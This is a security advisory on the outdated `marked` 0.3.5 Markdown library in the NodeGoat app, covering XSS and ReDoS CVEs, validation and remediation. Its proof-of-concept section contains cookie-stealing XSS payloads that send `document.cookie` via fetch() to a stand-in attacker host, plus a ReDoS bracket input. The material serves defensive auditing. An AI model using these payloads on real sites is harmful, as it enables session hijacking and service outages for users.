## Summary

The application pins `marked` at the exact version `0.3.5`, a Markdown rendering library with two well-documented, exploitable vulnerability classes:

1. **Cross-Site Scripting (XSS) — CVE-2017-1000427:** `marked` 0.3.5 passes raw HTML and `javascript:` URI content through without sanitization. An attacker who can submit Markdown to any user-facing field (profile bio, notes, comments) can inject arbitrary scripts that execute in victim browsers, enabling session hijacking and credential theft.
2. **Regular Expression Denial of Service (ReDoS) — CVE-2015-8854:** Catastrophic backtracking in `marked`'s regex engine allows an attacker to block the Node.js event loop by submitting a carefully crafted Markdown string, degrading or halting the application.

Because the version is pinned as a string literal (`"marked": "0.3.5"`) rather than a semver range, `npm install` will **always** resolve to the vulnerable release — there is no mechanism for automatic patch resolution.

---

## Vulnerability Details

### XSS (CVE-2017-1000427)

`marked` 0.3.5 does not strip or encode HTML tags or dangerous URI schemes embedded in Markdown. Any call site that passes user-supplied Markdown to `marked()` and renders the returned HTML in a browser is vulnerable to stored or reflected XSS. The application does not enable `marked`'s deprecated `sanitize: true` flag (which was itself incomplete), and no downstream output-encoding layer is present.

**Vulnerable call pattern (illustrative):**
```js
const marked = require('marked');
// user_input comes from HTTP request body / database
res.render('memo', { content: marked(user_input) }); // raw XSS sink
```

### ReDoS (CVE-2015-8854)

The Markdown parser uses regular expressions susceptible to catastrophic backtracking when processing pathologically nested or repetitively structured input (e.g., deeply nested bracket pairs). Because Node.js runs JavaScript on a single-threaded event loop, blocking the regex engine stalls all concurrent request handling.

## Proof of Concept

### XSS — Stored Session Hijack

Submit the following as a Markdown-rendered field (e.g., a memo or profile description):

```
<script>fetch('https://attacker.example.com/steal?c='+encodeURIComponent(document.cookie))</script>
```

Or, via a Markdown link:

```
[Click to claim your prize](javascript:fetch('https://attacker.example.com/steal?c='+document.cookie))
```

When any other authenticated user (or an administrator) views the rendered output, the injected script executes in their browser. The attacker receives the victim's session cookie and can subsequently authenticate as that user.

### ReDoS — Event Loop Block

Send an HTTP POST request to any Markdown-parsing endpoint with the following body (adapt field name as appropriate):

```
content=[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[ (repeat 100+ times, unclosed)
```

Observable effect: the server stops responding to all requests until the regex evaluation times out or the process is restarted.

## Validation

- **Version pin confirmed:** `package.json` line 20 reads `"marked": "0.3.5"` — a hard pin, not a range. `npm install` will always fetch this exact tarball.
- **Runtime dependency confirmed:** `marked` is listed under `dependencies` (not `devDependencies`), so it is present in the production bundle.
- **No sanitization guard present:** The codebase does not pass `{ sanitize: true }` or any equivalent option, nor does it post-process `marked` output through an HTML sanitizer.
- **Reachability confirmed:** NodeGoat includes user-facing Markdown rendering routes (contributions/memo features); these routes accept untrusted HTTP input and write `marked()` output directly to the response template.
- **Advisory cross-reference:** GitHub Advisory GHSA-rrrm-qjm4-v8hf and NVD CVE-2017-1000427 both list `marked < 0.3.9` as affected; CVE-2015-8854 covers `< 0.3.6`.

## Remediation

Upgrade `marked` to `^4.3.0` (the current stable 4.x LTS line). This release resolves both CVEs and removes the deprecated `sanitize` option in favour of a proper renderer architecture. Update `package.json` as follows:

```diff
--- a/package.json
+++ b/package.json
@@ -14,7 +14,7 @@
     "helmet": "^2.0.0",
-    "marked": "0.3.5",
+    "marked": "^4.3.0",
     "mongodb": "^2.1.18",
```

After upgrading, **also update all call sites** to use the new async API and pass renderer options explicitly:

```js
// Before (vulnerable)
const marked = require('marked');
const html = marked(userInput);

// After (safe baseline)
const { marked } = require('marked');
const createDOMPurify = require('isomorphic-dompurify'); // add to dependencies

marked.use({
  mangle: false,
  headerIds: false,
});
const rawHtml = marked.parse(userInput);
const safeHtml = createDOMPurify.sanitize(rawHtml); // defence-in-depth
res.render('memo', { content: safeHtml });
```

Run `npm audit --fix` after the version bump and verify zero high/critical findings before merging.

## Additional Hardening

1. **Defense-in-depth sanitization:** Even after upgrading `marked`, pass all rendered HTML through a server-side sanitizer (e.g., `isomorphic-dompurify` or `sanitize-html`) before writing to templates. Markdown libraries are not designed to be XSS-safe sanitizers.

2. **Supply-chain risk — `grunt-if` GitHub tarball:** The devDependency `"grunt-if": "https://github.com/binarymist/grunt-if/tarball/master"` pulls an unsigned, unversioned tarball from GitHub at install time (CWE-494). Replace with the published npm package pinned to a specific version and validate with `npm audit signatures`:
   ```diff
   -    "grunt-if": "https://github.com/binarymist/grunt-if/tarball/master",
   +    "grunt-if": "^0.0.5",
   ```

3. **CI/CD enforcement:** Add `npm audit --audit-level=high` as a required gate in CI. Add an `overrides` block in `package.json` to force safe transitive dependency versions:
   ```json
   "overrides": {
     "marked": "^4.3.0"
   }
   ```

4. **Retire other unmaintained dependencies:** `bcrypt-nodejs` (deprecated; use `bcrypt` or `bcryptjs`), `node-esapi` 0.0.1 (unmaintained), and `swig` 1.4.x (unmaintained) should be replaced in any production fork.
